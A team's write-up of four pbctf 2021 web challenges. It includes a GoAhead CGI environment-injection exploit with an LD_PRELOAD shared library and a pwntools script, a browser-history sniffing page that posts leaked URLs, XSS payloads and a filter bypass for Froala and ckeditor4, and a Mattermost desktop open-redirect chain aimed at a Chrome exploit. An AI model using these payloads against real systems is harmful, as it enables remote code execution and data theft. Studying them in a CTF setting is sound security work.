# pbctf 2021 - web tasks writeup

## Intro

Last week [we](https://ctftime.org/team/130817) played [pbctf 2021](https://ctftime.org/event/1371) and had fun solving those hard challenges. Web challenges were enjoyable😋 meanwhile difficult🤕.

## Advancement

> 9 solves
> Author: vakzz
> Description: I lost the login to my box, luckily I left the webserver running which should be enough to gain access


#### Intro

Basically, We had to find a 0day vulnerablity in a latest version [goahead webserver](https://github.com/embedthis/goahead/) that runs a cgi python script and get RCE 👀. 

#### Finding the vulnerablity

Fortunately, We could find the vulnerablity quickly; Maybe out of luck or maybe because one of our members had prepared a goahead challenge for future ctf but have had missed this bug while developing the challenge 😢. The bug lets you pass arbitrary environment variables to cgi program. Imagine how bad it can be!

The following part of `cgiHandler` function determines environment variables of the cgi process.

```c
// /src/cgi.c:171
envpsize = 64;
envp = walloc(envpsize * sizeof(char*));
if (wp->vars) {
    for (n = 0, s = hashFirst(wp->vars); s != NULL; s = hashNext(wp->vars, s)) {
        if (s->content.valid && s->content.type == string) {
            vp = strim(s->name.value.string, 0, WEBS_TRIM_START);
            if (smatch(vp, "REMOTE_HOST") || smatch(vp, "HTTP_AUTHORIZATION") ||
                smatch(vp, "IFS") || smatch(vp, "CDPATH") ||
                smatch(vp, "PATH") || sstarts(vp, "LD_")) {
                continue;
            }
            if (s->arg != 0 && *ME_GOAHEAD_CGI_VAR_PREFIX != '\0') {
                envp[n++] = sfmt("%s%s=%s", ME_GOAHEAD_CGI_VAR_PREFIX, s->name.value.string,
                    s->content.value.string);
            } else {
                envp[n++] = sfmt("%s=%s", s->name.value.string, s->content.value.string);
            }
            trace(0, "Env[%d] %s", n, envp[n-1]);
            if (n >= envpsize) {
                envpsize *= 2;
                envp = wrealloc(envp, envpsize * sizeof(char *));
            }
        }
    }
}
*(envp+n) = NULL;
```

It iterates through `wp->vars` which seems to be key-value map, Then it does some filtering stuff on key, and then it appends it to envp variable which will be passed to execve as environment variable. 

The only functions which add stuff to `wp->vars` are `websSetVar` and `websSetVarFmt` functions. `websSetVarFmt` function is just `websSetVar` with format string support. The `websSetVar` function appends variables to request's variables table which is our `wp->vars`. This map is used to store request headers, request variables and some other stuff like client's ip and used protocol. 
```c
// WebsKey definition
typedef struct WebsKey {
    struct WebsKey  *forw;                  /* Pointer to next hash list */
    WebsValue       name;                   /* Name of symbol */
    WebsValue       content;                /* Value of symbol */
    int             arg;                    /* Parameter value */
    int             bucket;                 /* Bucket index */
} WebsKey;
// /src/runtime.c:2072
PUBLIC WebsKey *websSetVar(Webs *wp, cchar *var, cchar *value)
{
    WebsValue   v;

    assert(websValid(wp));
    assert(var && *var);

    if (value) {
        v = valueString(value, VALUE_ALLOCATE);
    } else {
        v = valueString("", 0);
    }
    return hashEnter(wp->vars, var, v, 0);
}

```

Cross references indicated that we can pass arbitrary name/value to `webSetVar` from two places.

- `processContentData` function which handles multipart POST bodies. 

```c
// /src/upload.c:319
static bool processContentData(Webs *wp){
    // ...
    // ...
    if (wp->clientFilename) {
        /*
            Write the last bit of file data and add to the list of files and define environment variables
         */
        if (writeToFile(wp, data, len) < 0) {
            /* Proceed to handle error */
            websConsumeInput(wp, nbytes);
            return 1;
        }
        hashEnter(wp->files, wp->uploadVar, valueSymbol(file), 0);
        defineUploadVars(wp);
        wp->currentFile = 0;

    } else if (wp->uploadVar) {
        /*
            Normal string form data variables
         */
        data[len] = '\0';
        trace(5, "uploadFilter: form[%s] = %s", wp->uploadVar, data);
        websDecodeUrl(wp->uploadVar, wp->uploadVar, -1);
        websDecodeUrl(data, data, -1);
        websSetVar(wp, wp->uploadVar, data); //HERE
    }
    // ...
    // ...
}
```

- `addFormVars` function which is used to decode query parameters and POST bodies.

```c
// /src/http.c:1409
static void addFormVars(Webs *wp, char *vars)
{
    WebsKey     *sp;
    cchar       *prior;
    char        *keyword, *value, *tok;

    assert(wp);
    assert(vars);

    keyword = stok(vars, "&", &tok);
    while (keyword != NULL) {
        if ((value = strchr(keyword, '=')) != NULL) {
            *value++ = '\0';
            websDecodeUrl(keyword, keyword, strlen(keyword));
            websDecodeUrl(value, value, strlen(value));
        } else {
            value = "";
        }
        if (*keyword) {
            /*
                If keyword has already been set, append the new value to what has been stored.
             */
            if ((prior = websGetVar(wp, keyword, NULL)) != 0) {
                sp = websSetVarFmt(wp, keyword, "%s %s", prior, value);
            } else {
                sp = websSetVar(wp, keyword, value);
            }
            /* Flag as untrusted keyword by setting arg to 1. This is used by CGI to prefix this keyword */
            sp->arg = 1;
        }
        keyword = stok(NULL, "&", &tok);
    }
}
```

If you read developer's comments in above codes, You might spot the bug. The suspicious thing is that the `addFormVars` function sets `sp->arg` to 0 ( `sp` is the return value of `websGetVar` which is a reference to the added key/value structure ), While this doesn't happen in the `processContentData` function.

Lets take a look at the env variables handler in `cgi.c` again.

```c
// /src/cgi.c:51
PUBLIC bool cgiHandler(Webs *wp)
{
    // ...
    // ...
    envpsize = 64;
    envp = walloc(envpsize * sizeof(char*));
    if (wp->vars) {
        for (n = 0, s = hashFirst(wp->vars); s != NULL; s = hashNext(wp->vars, s)) {
            if (s->content.valid && s->content.type == string) {
                vp = strim(s->name.value.string, 0, WEBS_TRIM_START);
                if (smatch(vp, "REMOTE_HOST") || smatch(vp, "HTTP_AUTHORIZATION") ||
                    smatch(vp, "IFS") || smatch(vp, "CDPATH") ||
                    smatch(vp, "PATH") || sstarts(vp, "LD_")) {
                    continue;
                }
                // ME_GOAHEAD_CGI_VAR_PREFIX is "CGI_" by default
                if (s->arg != 0 && *ME_GOAHEAD_CGI_VAR_PREFIX != '\0') {
                    envp[n++] = sfmt("%s%s=%s", ME_GOAHEAD_CGI_VAR_PREFIX, s->name.value.string,
                        s->content.value.string);
                } else {
                    envp[n++] = sfmt("%s=%s", s->name.value.string, s->content.value.string);
                }
                trace(0, "Env[%d] %s", n, envp[n-1]);
                if (n >= envpsize) {
                    envpsize *= 2;
                    envp = wrealloc(envp, envpsize * sizeof(char *));
                }
            }
        }
    }
    *(envp+n) = NULL;
    // ...
    // ...
}
```

If the key/value's arg member is not set to 0, it's key will be prefixed by `CGI_`, But if it's 0, It's key will be used with no prefix! So we can just send a POST request with multipart body and set envs without any prefix.

We had a good control over environment variables and We were planning to play with environment variables that python uses. We thought that we can't use LD_PRELOAD because of filters on key. However... LD_PRELOAD was actually working and it was not getting filtered 😳.

```bash
curl 'http://localhost/cgi-bin/date' -F LD_PRELOAD=/tmp/lmao
# error in the terminal which was running goahead
# ERROR: ld.so: object '/tmp/lmao' from LD_PRELOAD cannot be preloaded (cannot open shared object file): ignored.
```

The code looked safe to me while i was reviewing it. The bug is actually funny. The bug? is how filter is using `strim` function. Look with what arguments it is called and how `strim` deals with that args :P.

Spoiler: `c3RyaW0gcmV0dXJucyAwIGlmIHNldCBpcyAwLCB0aHVzIGZpbHRlciBicmVha3M=`

```c
// /src/cgi.c:51
PUBLIC bool cgiHandler(Webs *wp)
{
    // ...
    // ...
    vp = strim(s->name.value.string, 0, WEBS_TRIM_START);
    if (smatch(vp, "REMOTE_HOST") || smatch(vp, "HTTP_AUTHORIZATION") ||
        smatch(vp, "IFS") || smatch(vp, "CDPATH") ||
        smatch(vp, "PATH") || sstarts(vp, "LD_")) {
        continue;
    }
    /// ...
}


PUBLIC char *strim(char *str, cchar *set, int where)
{
    char    *s;
    ssize   len, i;

    if (str == 0 || set == 0) {
        return 0;
    }
    if (where & WEBS_TRIM_START) {
        i = strspn(str, set);
    } else {
        i = 0;
    }
    s = (char*) &str[i];
    if (where & WEBS_TRIM_END) {
        len = strlen(s);
        while (len > 0 && strspn(&s[len - 1], set) > 0) {
            s[len - 1] = '\0';
            len--;
        }
    }
    return s;
}

PUBLIC int scmp(cchar *s1, cchar *s2)
{
    if (s1 == s2) {
        return 0;
    } else if (s1 == 0) {
        return -1;
    } else if (s2 == 0) {
        return 1;
    }
    return sncmp(s1, s2, max(slen(s1), slen(s2)));
}

PUBLIC bool smatch(cchar *s1, cchar *s2)
{
    return scmp(s1, s2) == 0;
}

PUBLIC bool sstarts(cchar *str, cchar *prefix)
{
    if (str == 0 || prefix == 0) {
        return 0;
    }
    if (strncmp(str, prefix, slen(prefix)) == 0) {
        return 1;
    }
    return 0;
}

```

#### Exploiting the vulnerablity

We then looked for temp files that goahead uses and discovered that goahead saves plain POST body in a file named `/tmp/cgi-${COUNTER}.tmp` and then it passes it as stdin to the cgi process.

```c
PUBLIC char *websTempFile(cchar *dir, cchar *prefix)
{
    static int count = 0;
    char   sep;

    sep = '/';
    if (!dir || *dir == '\0') {
#if WINCE
        dir = "/Temp";
        sep = '\\';
#elif ME_WIN_LIKE
        dir = getenv("TEMP");
        sep = '\\';
#elif VXWORKS
        dir = ".";
#else
        dir = "/tmp";
#endif
    }
    if (!prefix) {
        prefix = "tmp";
    }
    return sfmt("%s%c%s-%d.tmp", dir, sep, prefix, count++);
}

// POST body will be written in a filename returned by this function
PUBLIC char *websGetCgiCommName(void)
{
    return websTempFile(NULL, "cgi");
}
```

We thought of spraying temp files and then bruteforcing the counter. It was actually working and goahead was not cleaning up the temp files. When we tried it on the given environment, We faced the following error.

```
object '/tmp/lmao' from LD_PRELOAD cannot be preloaded (failed to map segment from shared object): ignored
```

We couldn't fix it after working on it for like 30mins. Apparently linker was failing to map file descriptor to memory for a reason we don't know. Maybe because tmpfs was acting weird?

We then tried using python environment variables but had no luck. 

> Appreantly some teams could actually use them! POC by thegrandpew. <br>
> ![POC](https://i.imgur.com/GalTxDx.png) <br>

While spraying cgi tmp files, We thought that we can either send data in stdin or add environment variables, Not both of them at once. But it turned out we could! To do that, First close the multi-part request with sending `${boundry}--` and then send the shared lib! this way evillib will be passed to cgi program as stdin and we can also set `LD_PRELOAD` to stdin. 

```http
POST /cgi-bin/date HTTP/1.1
Host: localhost:9000
User-Agent: curl/7.68.0
Accept: */*
Content-Length: {156+len(evillib)}
Content-Type: multipart/form-data; boundary=------------------------d98448e4e46e658c

--------------------------d98448e4e46e658c
Content-Disposition: form-data; name="LD_PRELOAD"

/dev/stdin 
--------------------------d98448e4e46e658c--
evillib
```

```
object '/dev/stdin' from LD_PRELOAD cannot be preloaded (failed to map segment from shared object): ignored
```
 `/dev/stdin` is just a symlink to our tmp file when we are opening it, so it actually made no difference, Except that we don't have to spray anymore. 

Since we didn't have to spray anymore, we tried it on remote for fun and it worked lmao. remote's tmpfs was not acting weird! So spray would work too if we had tried it on remote.

```py
#!/usr/bin/env python3
from pwn import *
import time
import requests
import os

TARGET_HOST = "advancement.chal.perfect.blue"
TARGET_PORT = 80
# TARGET_HOST = "localhost"
# TARGET_PORT = 1337

lolld = open("./lol.so","rb").read()
p = remote(TARGET_HOST,TARGET_PORT)
p.send(f"""POST /cgi-bin/date HTTP/1.1
Host: localhost:9000
User-Agent: curl/7.68.0
Accept: */*
Content-Length: {156+len(lolld)}
Content-Type: multipart/form-data; boundary=------------------------d98448e4e46e658c

--------------------------d98448e4e46e658c
Content-Disposition: form-data; name="LD_PRELOAD"

/dev/stdin 
--------------------------d98448e4e46e658c--
""".replace('\n',"\r\n").encode()+lolld)
p.interactive()
```

```c
/* compile: gcc -shared -o lol.so ./a.c -ldl */

#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int  geteuid() {
  char *cmd;
  if (getenv("LD_PRELOAD") == NULL) { return 0; }
  unsetenv("LD_PRELOAD");
  printf("content-type: text/plain\n\n");
  puts("WOOOOOOW");
  puts("FOOOOOO");
  system("cat /flag");
  puts("FFFFFF");
  exit(0);
  return 1;
}
```

## Vault

> 8 solves
> Author: vakzz
> Description: Can you unlock the secret from the vault?

#### Intro

The goal of this challenge was stealing browser's history. Basically admin navigates to 14 paths and then our given url and we have to somehow exfil those pathes in 30 seconds. We knew that there are methods to steal browser's history with css but all of them were either required user interaction or had patched. It almost took us 24 hours to solve this. We had to try many method on given environment and find a reliable one. I think we found three methods which were working locally but not on env/remote. The challenge and infras were pretty good but i think we could just do it better. 

#### osint

We started with finding papers/blogs about sniffing browser history with css. We first started with [this](https://bugs.chromium.org/p/chromium/issues/attachmentText?aid=340773) but it was slow. Then we tried methods in [this](https://cseweb.ucsd.edu/~dstefan/pubs/smith:2018:browser.pdf) paper but our exploits for them were slow too and sometimes unstable. Actually i think the problem was that our exploits were not good ( although we tried many combinations ). previous methods were working on remote but they were slow... Finally we found [this](https://github.com/onlyvae/Browser-History-Sniffing) and could speed it up ( actually we just changed few numbers lmao ). I think reloading page after each leak made it working. 

#### How is the exploit working?

you can find paper about how this exploit works [here](https://github.com/onlyvae/Browser-History-Sniffing/blob/master/history_sniff_NDSS_.pdf). Basically the function which you pass to `requestAnimationFrame` as argument will be called when browser wants to create new frame. For example the following code should print a number close to the fps of your browser.

```javascript
window.counter = 0;
rid = -1;
function d(){
    window.counter += 1;
    rid = requestAnimationFrame(d);
}
requestAnimationFrame(d)
setTimeout(()=>(console.log("counter:",window.counter),cancelAnimationFrame(rid)),1000)
```

But how can we use this to leak browser's history? Anchor tags have pseudo-class named `:visited`. Make sure you read about [this on mdn](https://developer.mozilla.org/en-US/docs/Web/CSS/:visited) if you don't know what it is or if you have a question like "Why can't we just change background image of visited anchor tags".

Basically the concept is that we force browser to do heavy css works for visited links. If we do this for many links, this will lead to fps drop. And we can distinguish visited and unvisited links. 

> How paper explains this attack: an attacker repeatedly switches the address of a hyperlink element between a target URL and an unvisited URL over a fixed time window and records how many times the browser invokes the callback function in requestAnimationFrame(). This number equals approximately the number of frames rendered by browsers over this time. If this number is obviously lower than the value measured by toggling the address of the hyperlink element between two unvisited URLs, then the target URL is identified as a visited URL
```html

<!DOCTYPE html>
<html>
    <head>
        <style>
            #out a {
                display: inline-block;
                transform: perspective(100px) rotateY(10deg);
                filter: contrast(200%) drop-shadow(16px 16px 10px #fefefe) saturate(200%);
                color: red;
            }

            #out a:visited {
                color: blue;
            }

            #out {
                position: fixed;
                top: 0px;
                left: 500px;
            }
        </style>
    </head>
    <body>
        <div id="out">
        </div>
        <script>
            var urls = [location.href, 'http://notvisited' + ((Math.random() * 100000000) | 0) + '.foo'];
            for(let i =0;i<33;i++){
                let prefix = window.name != "" ? window.name : "http://web:5000/"
                // let prefix = window.name != "" ? window.name : "http://vault.chal.perfect.blue/"
                urls.push(prefix+i+"/")
            }
            requestAnimationFrame = window.requestAnimationFrame || window.mozRequestAnimationFrame || window.webkitRequestAnimationFrame || window.msRequestAnimationFrame;
            var out = document.getElementById('out');
            var statisticalTime = 200;
            var counter = 0;
            var stop = true;
            var start;
            var currentUrl = 0;

            function initStats() {
                currentUrl = 0;
                start = NaN;
                counter = 0;
                if (stop) {
                    stop = false;
                    loop();
                }
            }

            function startLeaking() {
                out.style.textShadow = "black 1px 1px 10px";
                write();
                resetLinks();
                initStats();
            }

            function write() {
                var s = '';
                var url = urls[currentUrl];
                for (var i = 0; i < 50; i++) {
                    s += "<a href=" + url;
                    s += url; 
                    s += ">#####</a>"
                }
                out.innerHTML = s;
            }

            function updateLinks() {
                var url = urls[currentUrl];
                for (var i = 0; i < out.children.length; i++) {
                    out.children[i].href = url;
                    out.children[i].style.color = 'red';
                    out.children[i].style.color = '';
                }
            }
            function resetLinks() {
                for (var i = 0; i < out.children.length; i++) {
                    out.children[i].href = 'http://' + Math.random() + '.asd';
                    out.children[i].style.color = 'red';
                    out.children[i].style.color = '';
                }
            }
            function loop(timestamp) {
                threshold = 11.875;
                // threshold = 22;

                if (stop) return;
                if (!start) start = timestamp;
                if (timestamp > start + statisticalTime) {
                    if (currentUrl >= 2) {
                        if(counter<=threshold){
                            window.name = urls[currentUrl];
                            fetch("?",{method:"POST",body:urls[currentUrl]})
                            document.location.reload()
                            throw 1;
                        }
                    }
                    currentUrl++;
                    counter = 0;
                    start = NaN;
                }
                if (counter % 2 == 0) {
                    updateLinks();
                } else {
                    resetLinks();
                }
                counter++;
                requestAnimationFrame(loop);
            }

            window.onload = startLeaking;
        </script>
    </body>
</html>
```

## WYSIWYG

> 3 solves
> Author: vakzz
> Description: Is seeing considered believing in the security?


#### Intro

In this challenge, we had to get XSS on 3 popular WYSIWYG editors; [tinyMCE](https://github.com/tinymce/tinymce), [ckeditor4](https://github.com/ckeditor/ckeditor4) and [froala](https://github.com/froala/wysiwyg-editor) ( Howevery we could get the flag with exploiting only two of them :P). 

Admin bot first xors the flag with three random values, and then it visits each editor with one of those random values in cookie and each editor parses our given text. Our text should contain less than 126 characters and it should be able to exploit all 3 editors. 

#### Froala

We found the following payload in [this](https://labs.bishopfox.com/advisories/froala-editor-v3.2.6) advisory and it turned out that it's working in latest version of froala. The challenge was using version 4.0.4 but payload works on 4.0.6 too which is the latest version right now. 

```
<math><iframe><!--</iframe><img src onerror=alert()>
```

#### TinyMCE

We could't exploit it after working on it for two hours. We were worried about the length limit and were about to move to another challenge. However we realized that we don't even need to find XSS on this editor lol. We could just open iframe to our website and then redirect parent to froala editor with XSS payload.

#### ckeditor4

Exploiting this editor took most of our time. It doesn't allow iframes and meta tags so we had to find another way to redirect admin to our website. After some manual fuzzings, We started to review the source code for bugs.

##### Exploiting ckeditor4

After a lot of source code review and debugging, we got XSS on this editor. We downloaded the source code from [here](https://github.com/ckeditor/ckeditor4/releases/tag/4.16.2).  The bug was actually quite simple and you can find these kind of vulnerablites in beginners php web challenges xd. The bug was something like the following php challenge. 

```php
<?php
// index.php
$want = str_replace("flag","",$_GET["iwant"]);
if($want == "flag"){
    readfile("/flag");
}
```

parsing the text starts from `/core/htmldataprocessor.js:53`. We call it filter function for example.

```javascript
editor.on( 'toHtml', function( evt ) {
	var evtData = evt.data,
		data = evtData.dataValue,
		fixBodyTag;

	// Before we start protecting markup, make sure there are no externally injected
	// protection keywords.
	data = removeReservedKeywords( data );

	// The source data is already HTML, but we need to clean
	// it up and apply the filter.
	data = protectSource( data, editor );

	// Protect content of textareas. (https://dev.ckeditor.com/ticket/9995)
	// Do this before protecting attributes to avoid breaking:
	// <textarea><img src="..." /></textarea>
	data = protectElements( data, protectTextareaRegex );

	// Before anything, we must protect the URL attributes as the
	// browser may changing them when setting the innerHTML later in
	// the code.
	data = protectAttributes( data );

	// Protect elements than can't be set inside a DIV. E.g. IE removes
	// style tags from innerHTML. (https://dev.ckeditor.com/ticket/3710)
	data = protectElements( data, protectElementsRegex );

	// Certain elements has problem to go through DOM operation, protect
	// them by prefixing 'cke' namespace. (https://dev.ckeditor.com/ticket/3591)
	data = protectElementsNames( data );

	// All none-IE browsers ignore self-closed custom elements,
	// protecting them into open-close. (https://dev.ckeditor.com/ticket/3591)
	data = protectSelfClosingElements( data );

	// Compensate one leading line break after <pre> open as browsers
	// eat it up. (https://dev.ckeditor.com/ticket/5789)
	data = protectPreFormatted( data );

	// There are attributes which may execute JavaScript code inside fixBin.
	// Encode them greedily. They will be unprotected right after getting HTML from fixBin. (https://dev.ckeditor.com/ticket/10)
	data = protectInsecureAttributes( data );

	var fixBin = evtData.context || editor.editable().getName(),
		isPre;

	// Old IEs loose formats when load html into <pre>.
	if ( CKEDITOR.env.ie && CKEDITOR.env.version < 9 && fixBin == 'pre' ) {
		fixBin = 'div';
		data = '<pre>' + data + '</pre>';
		isPre = 1;
	}

	// Call the browser to help us fixing a possibly invalid HTML
	// structure.
	var el = editor.document.createElement( fixBin ); // fixBin = "body"
	// Add fake character to workaround IE comments bug. (https://dev.ckeditor.com/ticket/3801)
	el.setHtml( 'a' + data ); //data is our input.
	data = el.getHtml().substr( 1 ); 

	// Restore shortly protected attribute names.
	data = data.replace( new RegExp( 'data-cke-' + CKEDITOR.rnd + '-', 'ig' ), '' );

	isPre && ( data = data.replace( /^<pre>|<\/pre>$/gi, '' ) );

	// Unprotect "some" of the protected elements at this point.
	data = unprotectElementNames( data );

	data = unprotectElements( data );

	// Restore the comments that have been protected, in this way they
	// can be properly filtered.
	data = unprotectRealComments( data );

	if ( evtData.fixForBody === false ) {
		fixBodyTag = false;
	} else {
		fixBodyTag = getFixBodyTag( evtData.enterMode, editor.config.autoParagraph );
	}

	// Now use our parser to make further fixes to the structure, as
	// well as apply the filter.
	data = CKEDITOR.htmlParser.fragment.fromHtml( data, evtData.context, fixBodyTag );

	// The empty root element needs to be fixed by adding 'p' or 'div' into it.
	// This avoids the need to create that element on the first focus (https://dev.ckeditor.com/ticket/12630).
	if ( fixBodyTag ) {
		fixEmptyRoot( data, fixBodyTag );
	}

	evtData.dataValue = data;
}, null, null, 5 );
```

The `protectElements` function converts textareas to custom elements to avoid content being used in filtering process. Why? Because filter function first does some html processing with regexps lol. For example filter function should first replace or remove `on.*` attributes to prevent XSS in fixing HTML structure phase. To fix our given dirty HTML structure, This function first creates an element and then it puts our dirty HTML inside it and then it gets innerHTML of that element. 

```javascript
// Protect on.* attributes

// First it removes onerror= attributes with regexp
// Call the browser to help us fixing a possibly invalid HTML
// structure.
var el = editor.document.createElement( fixBin ); // fixBin = "body"
// Add fake character to workaround IE comments bug. (https://dev.ckeditor.com/ticket/3801)
el.setHtml( 'a' + data ); //data is our input.
data = el.getHtml().substr( 1 ); 

// Unprotect on.* attributes
// Rest of the filter...
```

Now imagine if the above code wants to parse `<textarea><img src=1 onerror=alert()></textarea>`. Filter first adds a prefix to onerror attribute (for example `example-`) and then it fixes HTML and then it want to add onerror to element again ( Removing dangerous attribute for final HTML output happens later, somewhere else, We just want to *fix* the HTML like closing unclosed tags). The output of `data` at above code will be `<textarea>&gt;img src=1 example-onerror=alert()&lt;</textarea>`. The content inside textarea is HTML escaped, So it can't convert example-onerror to onerror. That's why `protectElements` function exists. It's added because of [this issue](https://dev.ckeditor.com/ticket/9995). 

`protectElements` function first urlencodes textareas and then put them inside `<cke:encoded>` tag, so `<textarea></textarea>` will result in `<cke:encoded>%3Ctextarea%3E%3C%2Ftextarea%3E</cke:encoded>`. 

We tried passing `<cke:encoded>%3Cimg%3E</cke:encoded>` directly to see what happens. It was getting removed. We then remembered `removeReservedKeywords` function.  

```javascript
editor.on( 'toHtml', function( evt ) {
	var evtData = evt.data,
		data = evtData.dataValue,
		fixBodyTag;

	// Before we start protecting markup, make sure there are no externally injected
	// protection keywords.
	data = removeReservedKeywords( data );

	// The source data is already HTML, but we need to clean
	// it up and apply the filter.
	data = protectSource( data, editor );

	// Protect content of textareas. (https://dev.ckeditor.com/ticket/9995)
	// Do this before protecting attributes to avoid breaking:
	// <textarea><img src="..." /></textarea>
	data = protectElements( data, protectTextareaRegex );

	// Before anything, we must protect the URL attributes as the
	// browser may changing them when setting the innerHTML later in
	// the code.
	data = protectAttributes( data );
    
	// Rest of the code... 
}
```

It was because of that `removeReservedKeywords` function. The function is long so here is part of the code.

```javascript
function createEncodedKeywordRegex() {
	return new RegExp( '(' +
		// Create closed element regex i.e `<cke:encoded>xxx</cke:encoded>`.
		createEncodedRegex( '<cke:encoded>' ) +
		'(.*?)' +
		createEncodedRegex( '</cke:encoded>' ) +
		')|(' +
		// Create unclosed element regex i.e `<cke:encoded>xxx` or `xxx</cke:encoded>` to make sure that
		// element won't be closed by HTML parser and matched by `unprotectElements` function.
		createEncodedRegex( '<' ) +
		createEncodedRegex( '/' ) + '?' +
		createEncodedRegex( 'cke:encoded>' ) +
		')', 'gi' );
}

var encodedKeywordRegex = createEncodedKeywordRegex();
return data.replace( encodedKeywordRegex, '' ); //data is our input
```   

Like that php challenge, It replaces the keyword but a HTML text like `<c<cke:encoded></cke:encoded>ke:encoded>URLENCODEDHTML</c<cke:encoded></cke:encoded>ke:encoded>` can bypass it!

We then tried`<c<cke:encoded></cke:encoded>ke:encoded>%3Cimg src=1 onerror=alert()%3E</c<cke:encoded></cke:encoded>ke:encoded>` but we didn't see an alert. Text editor was producing safe HTML.

`<img data-cke-saved-src="1" src="1">`.

It was because there was another filtering phase in the codebase. We didn't look at that part. So we were wondering what to do, We then realized that the function which converts our HTML to object tree is not so smart! 

```javascript
// Now use our parser to make further fixes to the structure, as
// well as apply the filter.
data = CKEDITOR.htmlParser.fragment.fromHtml( data, evtData.context, fixBodyTag );
```

The `CKEDITOR.htmlParser.fragment.fromHtml` method is at the end of our filtering function. It parses our HTML and generate a node tree. Something like the folowing object.

```javascript
{
    "attributes" : [], 
    "children" : [],
    "name" : "img",
    "type" : "element" // This is type of the node, in JS it's prototype of object not an attribute 
}
```

We then realized that if we pass unclosed HTML tag to this function, It produces a text node instead of HTML node. For example if we pass `<img src=1 onerror=alert()` it produces the following object.
```javascript
{
    "value" : "<img src=1 onerror=alert()"
    "type" : "text" // This is type of the node, in JS it's prototype of object not an attribute 
}
```

We can't pass unclosed HTML text to this method normally because it gets fixed before reaching there (that HTML structure fixing phase). However we can do it using that bug in `removeReservedKeywords` function.

```
<c<cke:encoded></cke:encoded>ke:encoded>%3Cimg src=1 onerror="alert()"</c<cke:encoded></cke:encoded>ke:encoded>
```

It worked and we saw an alert!

#### Putting all together

The following payload opens an iframe to example.com on all text editors.

```
<iframe src="//example.org"></iframe><c<cke:encoded></cke:encoded>ke:encoded>%3Ciframe src="//example.com"
```

Then you can open an iframe or redirect to froala or ckeditor with XSS payload in the url. This approach is apparently unintended.

## In the End

### Intro

This challenge involved finding and exploiting a 1-day vulnerability in a popular open source communication platform called Mattermost. We could send a direct message to admin via a webhook API. Admin was using Mattermost desktop to view the messages we send to it and admin was also clicking our message. 

#### How to setup server

You can download the mattermost server from  [here](https://releases.mattermost.com/5.33.3/mattermost-5.33.3-osx-amd64.tar.gz). Follow the instructions listed in [officual docs]( https://docs.mattermost.com/install/installing-ubuntu-2004-LTS.html) to setup the server locally and you should be able to visit the server at http://localhost:8065/login


Create an admin + normal user account and a channel (explained in the challenge README file) and you are ready to go.
![](https://i.imgur.com/5cB7FJz.png)

#### How to setup Client

Download the vulnerable client from [here](https://github.com/mattermost/desktop/releases/tag/v4.6.2).

### Finding the Vulnerability

Doing some OSINT we found out that the challenge author (@knapstack) had recently reported a vulnerablity on mattermost client.  

 
> https://mattermost.com/security-updates/ 
> (Remote Code Execution) Upgraded Electron to prevent latest >vulnerabilities. Thanks to Aaditya Purani for contributing to this >improvement under the Mattermost responsible disclosure policy. 
> 
> (Input Validation) Fixed an issue where a specially crafted link bypassed security checks and allowed opening arbitrary web pages within the desktop app. Thanks to Elnerd for contributing to this improvement under the Mattermost responsible disclosure policy.


We looked at the chrome version that electron was using and it looked vulnerable `(It was using chrome 75)`. We quickly tried [this exploit](https://gist.github.com/r4j0x00/a8534a7f061af660de7baf68e8b39b10) on it. We did it by pasting exploit to the chrome developer tools console ( You can open it with ctrl+shift+i).

![](https://i.imgur.com/ZgwpSOJ.png)

The line `[+] Address of rwx page: 4c27b2dba9` proved that the exploit was working. The shellcode needed some tweaking but we were confident that it wasthe right path.

Next we needed to find a XSS or Open Redirect in the chat app to redirect admin to a webpage we control to execute our chrome exploit. So, We started looking for a way to do so.

Mattermost is an open source application and it has an [API documentation](https://api.mattermost.com/). Skimming through the API docs, an API endpoint caught our eye, Its title was [Get an image by url](https://api.mattermost.com/#operation/GetImageByUrl)

![](https://i.imgur.com/UzYkoJy.png)

Trying different API parameters, We were able to achieve a open redirect.

`http://localhost:8065/api/v4/image?url=https://google.com`

Opening the above link redirects you to google.com on web client. Doing the same did not work on the Desktop client. We just needed to bypass some checks and then we were able to redirect admin to our webpage.

We found [this](https://github.com/mattermost/desktop/commit/f4f64c50a9eaf7fa472acc70f4f7e7bf4a190883) commit which was patching the other vulnerablity. Apparently something was going wrong with pathes containing multiple slahes, For example `http://example.org//ff//fff`.

After some trials and Errors we were able to redirect admin to any page with a click on an image. 

```
[![Mattermost](https://www.google.com/images/branding/googlelogo/2x/googlelogo_light_color_272x92dp.png)](http://localhost:8065/////localhost:8065/../../../..//api//v4///image?url=http://google.com)
```

![](https://i.imgur.com/1W3Cqcs.png)

![](https://i.imgur.com/Ey7NUm6.png)

Clicking on google Logo took us to `https://google.com`

![](https://i.imgur.com/x9pjYSa.jpg)


### Exploiting the Vulnerability

We tried our exploit on the remote and we could get the flag with our first try ( we were limited to 3 tries ).  

> Thank you zer0pts for solving it while the author was offline (The other admin didn't know that the server ip should be kept private). pb was kind enough to provide server address to us too because they have given it to zer0pts. The intended solution had a server address check bypass and i think finding that bypass within an hour was not easy. You can find the intended solution [here](https://gist.github.com/aadityapurani/92905581fb62249be0fdac6f11efe611).

  
